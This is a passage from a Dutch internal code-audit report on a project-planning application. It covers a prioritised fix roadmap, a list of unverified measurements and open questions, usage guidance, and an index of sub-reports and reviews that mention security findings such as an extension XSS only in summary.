| 39 | Print↔scherm: gedeelde constanten, `timelineTiers` en `getWeekNumberFor` in `printPreview` | S | Het minimumvoorstel. **Niet** de Draw2D-convergentie — die vergt negen extra primitieven en een transform-stack in twee backends. |
| 40 | `docs/ifc-round-trip.md` + archiveringsronde in `docs/superpowers/` + `scripts/README.md` en wave6-scripts opruimen | S | Documentatie ná de mechanische borging (item 14), zodat het een toelichting is op een afgedwongen route en geen vervanging ervan. |
| 41 | `createAppStore()`-factory naast de singleton | M | Sleutel tot split view met twee documenten, cross-project solve en resourcepooling — de enige geplande architecturale investering. Niet doen vóór item 26. |

**Waarom deze volgorde.** Fase "nu" bevat uitsluitend ingrepen die stil dataverlies of stille onbeschikbaarheid stoppen, of die een poort openzetten die de rest goedkoper maakt (items 4, 7, 10). Alles daar is XS of S; de hele fase is realistisch een tot twee dagen. Fase "deze maand" bevat het werk dat een echte verbouwing is (parser, recovery, foutkanaal) plus de borging die voorkomt dat het opnieuw gebeurt — en de borging staat er bewust *vóór* of *tegelijk met* de verbouwing, niet erna. Fase "structureel" is refactorwerk zonder acuut correctheidsrisico, waar de volgorde binnen de fase wél uitmaakt: goedkope voorlopers (31) vóór dure registers (34), ontkoppeling (29) vóór collisiechecks, en de store-factory (41) helemaal achteraan omdat hij de hele state-laag raakt.

---

## 6. Onzekerheden en open vragen

Wat niet geverifieerd kon worden, en dus niet als vaststaand mag worden gelezen.

**Metingen die niet zijn gereproduceerd.**
- Heap-gedrag van de undo-stack bij grote projecten. Het getal 248 MB na 50 bewerkingen bij 5.000 taken komt uit de eigen prestatie-audit en is door geen enkele review nagerekend. De edgecase-review mat wél zelf ~150 MB geserialiseerd / ~346 MB heap bij 800 taken (en corrigeerde daarmee de 524 MB uit het deelrapport naar beneden). Behandel de orde van grootte als vaststaand, de exacte getallen niet — en niet als crashpad (zie §3.7).
- De `addTask`-timings bij 5.000 en 10.000 taken. De review mat tot 1.600 taken; de superlineaire trend is bevestigd, de absolute getallen liggen daar lager dan het deelrapport claimt.
- De `dfsVisit`-drempel is stack- en versieafhankelijk: ~4.500 knopen in Node v22, maar dat getal is geen constante.
- De prestatiegetallen (`runCPM` 21,4 s bij 2.500 taken, `addTask` 16,2 s) komen uit de audit, die er zelf bij zet dat de absolute ms **indicatief** zijn en dat de 2.500/5.000-metingen in de browser openstaan. Ze zijn niet hermeten.
- Alle UI-prestatiegetallen uit de edgecase-sweep (`resourceNames` 1.504 ms, `TableEditor` 148 ms/render) — expliciet `[VERMOED]` gelaten door de review, deels omdat ze een echte browser vereisen.
- Het gedrag van een uurkalender zonder werkbanden: het codepad is dwingend, maar niet end-to-end door de store gedraaid.
- "141 exports zonder externe consument, waarvan 103 onnodig geëxporteerd" — methode niet opgegeven; de negen volledig dode exports zijn wél bevestigd. Idem "31 exacte 10-regel-clones" en de duplicatieclaim P6↔MSPDI.

**Runtime-gedrag dat alleen via codelezing is vastgesteld.**
- Alle Tauri-recovery-paden. Er is in dit onderzoek geen Tauri-runtime gedraaid; de bewijsvoering voor K4 en K5 is code-onderbouwing plus een nagebouwde opruimlus.
- De web/IndexedDB-backend van `recoveryStore`.
- Of `saveFileDialogWeb` ook kan rejecten — de hangende sluitdialoog staat alleen voor Tauri hard.
- Of twee productie-Tauri-vensters op elk OS überhaupt startbaar zijn (relevant voor de ernst van K5).
- De UI-paden van de `ui`-taak-id-lekkage en de `switchDocument`-stale-planning: code-onderbouwing sluitend, een Playwright-run zou het definitief maken.
- Het RTL-effect op balklabels in de canvas-renderer, het gedrag van `showSaveFilePicker` bij een ongeldige `suggestedName`, en of user activation een `requestPermission()`-prompt overleeft — alle drie vereisen een echte browser.
- De extensie-XSS is regel voor regel door de datastroom gevolgd maar niet daadwerkelijk laten vuren.

**Externe systemen.**
- Interop tegen echte derde-partij-IFC-parsers (Synchro, BlenderBIM, Navisworks). De conclusie dat onze bestanden voor hen ongeldig zijn volgt uit de spec en uit de ongeëscapete header, niet uit een test.
- Of `github-script@v8` een unhandled rejection alsnog opslokt (de wrapper-source is gelezen op main, niet op de gepinde versie).
- Draft-gedrag van `createRelease` bij een re-run: het rapport claimt 422 `already_exists`; de review vermoedt dat GitHub voor **drafts** meerdere releases op hetzelfde `tag_name` toestaat en er dus een tweede draft ontstaat. Conclusie ("niet herstartbaar, geen faalscenario-doc") staat, mechanisme niet.
- Atomiciteit van de `latest.json`-merge in tauri-action — waar de fix `max-parallel: 1` op leunt.
- Of `libappindicator3-dev` daadwerkelijk ontbreekt op ubuntu-24.04 (de reden voor de gepinde runner).
- Of de minisign-privésleutel ergens buiten GitHub-secrets bestaat. Niet vast te stellen vanuit de repo.
- Welke checks required zijn op de protected branch `main`. De branch ís protected; de configuratie was niet leesbaar. Dit bepaalt hoe erg de `live.yml`-race precies is.

**Openstaande beoordelingsvragen.**
- `run.sh` schrijft vaste artefactnamen in de repo-boom. Of twee gelijktijdige runs elkaar clobberen is `[VERMOED · hoog]` en niet getest — vreemd voor een expliciet multi-worktree-ingerichte repo.
- Of `sequenceSlice` en `baselineSlice` terecht geen `recomputeViewRows()` aanroepen: `BuiltinFieldKey` bevat CPM-afgeleide velden (`isCritical`, `totalFloat`) die indirect relatie-afhankelijk zijn, dus met `autoCalcCPM` uit toont een filter op `isCritical` tussen een relatie-edit en F5 verouderde rijen. `[VERMOED · hoog]`.
- Of de taalwissel per release (EN/NL/EN-boilerplate) bewust is.
- De marktbewering "infra/GWW 2.000–5.000 taken" komt uit `PLAN.md` §9 — het verkoopdocument dat het strategische rapport zelf onbetrouwbaar noemt — en hangt bovendien aan het verkeerd gelabelde 21,4 s-getal. Niet bruikbaar als onderbouwing zonder eigen marktverificatie.

---

## 7. Hoe dit document te gebruiken

- **Voor uitvoering:** begin bij §5, fase "nu". Elk item verwijst terug naar een K-nummer in §2 met bewijs en de gecorrigeerde fix.
- **Voor context bij één bevinding:** §2 geeft de samenvatting, §3 het gebied eromheen, en het genoemde deelrapport + review geven de volledige onderbouwing inclusief de experimenten.
- **Bij twijfel over een getal:** de review is leidend boven het deelrapport. Waar dit hoofdrapport en een deelrapport verschillen, is dit hoofdrapport leidend — het verwerkt de reviewcorrecties.
- **Wat níet in dit document staat:** de volledige experimentbeschrijvingen, de regel-voor-regel-tabellen (cross-slice-schrijfacties, workflow-injectielocaties, de dekkingskaart per module, de i18n-diffs) en de afgewezen alternatieven. Die staan in de deelrapporten.

---

## 8. Index

### Deelrapporten (`deelrapporten/`)

| Bestand | Eén regel | Poortoordeel van de review |
|---|---|---|
| `rapport-architectuur.md` | State-laag, documentcontract, undo, slice-grenzen, engine-koppeling; 17 bevindingen | Ja, met correcties — best onderbouwde deelrapport |
| `rapport-metrieken.md` | Omvang, hotspots, type-hygiëne, dependencies, hygiënepoorten; 14 bevindingen | Voorwaardelijk — Draw2D-voorstel en twee headline-getallen weerlegd |
| `rapport-ifc.md` | STEP-parser, round-trip-contract, recovery, interop, GUID-generatie; B1–B12 | Door, als betrouwbaar, met correcties |
| `rapport-testbaarheid.md` | Suite-kwaliteit, dekkingskaart (38 %), vacuüm-groene cases, pijplijnkoppeling; 17 bevindingen | Ja, na correcties |
| `rapport-ui-i18n.md` | God-component, actie-oppervlakken, platformsplit, i18n-borging, a11y; 14 bevindingen | Voorwaardelijk — drie van vier dragende claims opgeblazen |
| `rapport-docs-proces.md` | Documentatie-actualiteit, release-keten, scripts, extensie-ecosysteem, governance; 32 bevindingen | **Nee** — twee grootste release-gaten gemist |
| `rapport-big-picture-strategisch.md` | Ontwikkelmodel, IFC-strategie, dual-product, roadmap vs capaciteit, schaalbaarheid; 23 observaties + 7 aanbevelingen | **Nee** — bewijsapparaat niet leverbaar |
| `rapport-big-picture-systemisch.md` | Zeven risicoketens die door meerdere lagen lopen (dataverlies, extensies, export, release, kennis, multi-instantie, stille fouten) | Door — vier scherpste beweringen staan als een huis |
| `rapport-workflows.md` | Alle vijf GitHub-workflows, injectieklasse, pinning, gates; O1–O7 + 40 puntsgewijze bevindingen | **Nee** — prioriteitslijst stuurt verkeerd |
| `rapport-edgecases.md` | 100+ randgevallen headless bewezen: datum/tijd, CPM-randen, invoer-extremen, multi-document, I/O, UI, getallen | **Ja** — het enige onvoorwaardelijke oordeel; geen valse (c) gevonden |

### Reviews (`reviews/`)

| Bestand | Wat de review er vooral aan veranderde |
|---|---|
| `review-architectuur.md` | Voegde de `payloadFromInput`-tweelingbug toe (verscheept pad, niet dev-only); ontdekte drie taak-id's in `UIState` die de tabwissel overleven; corrigeerde de cyclustelling naar drie en de faalmodus van TDZ naar stille `undefined`-capture; draaide het `DATE_RELEVANT_TASK_KEYS`-voorstel om naar een blacklist |
| `review-metrieken.md` | Weerlegde het Draw2D-voorstel (negen ontbrekende primitieven; `draw2d.ts` zegt het tegenovergestelde); herijkte de 88 nl-strings (getal klopt, duiding niet; fr zit vrijwel gelijk); vond dat er al een toast bestaat; toonde dat het schrappen van de home-read-capability de MRU-lijst breekt |
| `review-ifc.md` | Vond twee extra string-onveilige lagen (sectie-split en commentaar-strip); mat het gedeeltelijke recovery-herstel (80 % → alle taken, nul relaties); verzwaarde `ifcGuid` naar reproduceerbare collisies vanaf 50k; trok het "0 taken = weggooien"-voorstel in; corrigeerde de `verify:examples`-claim |
| `review-testbaarheid.md` | Vond de root cause (`tests/` wordt niet getypecheckt) en verbreedde het vacuümgat naar de hele casus-JSON; herformuleerde de extensiesectie rond "geen sandbox, alleen conventie"; corrigeerde de `__APP_VERSION__`- en `permissions.ts:151`-duidingen |
| `review-ui-i18n.md` | Ontmantelde de "8× dezelfde actie"-claim (drie echt identiek) en vond de één-regel-oorzaak op `taskSlice.ts:161`; trok de guard-divergentie in; verwierp de hexkleuren-regel; toonde aan dat `i18n-diff.mjs` altijd exit 0 geeft |
| `review-docs-proces.md` | Voegde de twee grootste release-gaten toe (nul tests in `release.yml`, ongegate `live.yml`); toonde dat de lege updater-notes twee releases op rij zijn; corrigeerde het fix-voorstel (publish-release heeft geen checkout); schrapte de snapcraft-alinea; waardeerde `read_file`/`write_file` op |
| `review-big-picture-strategisch.md` | 24 PR's → 12; "24× groter" ongeldig verklaard; `runCPM` ≠ `solve` (factor 4) en de gemiste derde hotspot `flattenOrder`; projectleeftijd 6 maanden met een releasegat; corrigeerde de parser-faalmodi-tabel en vond de header/projectnaam-vector |
| `review-big-picture-systemisch.md` | Bevestigde de vier scherpste ketens experimenteel (manifest-XSS bij uitgeschakelde extensies, prefix-collisie in de opruimlus, weggegooide baselines, hangende sluitdialoog); splitste de drie injectiesites naar severity; corrigeerde de catch-census en beprijsde de vier "goedkoopste brekingen" eerlijk |
| `review-workflows.md` | Toonde aan dat de `await`-faalmodus onder Node 22 niet bestaat; herwaardeerde de `latest.json`-race naar MIDDEL met meetgegevens; **vond dat v2026.7.12 geen Snap heeft en de tag op de verkeerde commit staat**; corrigeerde O1 naar zeven locaties met een geldige PoC-tag; schrapte het `grep -q`-voorstel |
| `review-edgecases.md` | Bevestigde `parseDate` in zeven tijdzones én dat de voorgestelde fix compleet is (`run.sh` exit 0 onder New York); toonde dat de NY-uitval veel breder is dan de zes genoemde categorieën; bevestigde de DST/Azoren-variant met een directe probe; corrigeerde de `dfsVisit`-drempel naar ~4.500 en het undo-geheugen naar ~346 MB heap, en ontmaskerde de `Invalid string length` als meet-artefact in plaats van crashpad |
</content>
</invoke>
